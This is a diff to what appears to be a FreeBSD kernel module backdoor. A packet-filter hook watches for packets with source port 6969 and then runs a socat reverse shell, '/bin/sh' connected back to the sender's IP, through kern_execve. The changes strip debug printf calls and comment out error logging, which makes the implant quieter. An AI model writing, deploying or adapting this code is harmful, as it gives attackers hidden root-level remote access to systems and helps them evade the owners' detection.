@@ -140,12 +140,11 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
 
     // give it the current thread
     struct thread *curr_td = curthread;  // Macro to get current thread
-    printf("Current thread ID: %d\n", curr_td->td_tid);
 
     error = kern_execve(curr_td, &args, NULL, NULL);
-    if (error != 0) {
-        printf("[LKM] kern_execve returned: %d\n", error);
-    }
+    // if (error != 0) {
+    //     printf("[LKM] kern_execve returned: %d\n", error);
+    // }
 
 }
 
@@ -281,8 +280,6 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
         (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
         (ntohl(ip_header->ip_src.s_addr)) & 0xFF);
 
-    printf("Kernel IP Address: %s\n", attacker_ip_str);
-
     // create the reverse shell command
     snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh,stderr 2>/dev/null", attacker_ip_str, LISTEN_PORT);
 
@@ -315,9 +312,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
         return PFIL_PASS;
     }
 
-    printf("Packet with source port 6969 detected!!\n");
     return PFIL_PASS;
-
 }
 
 // get the IPv4 head to add our hook to
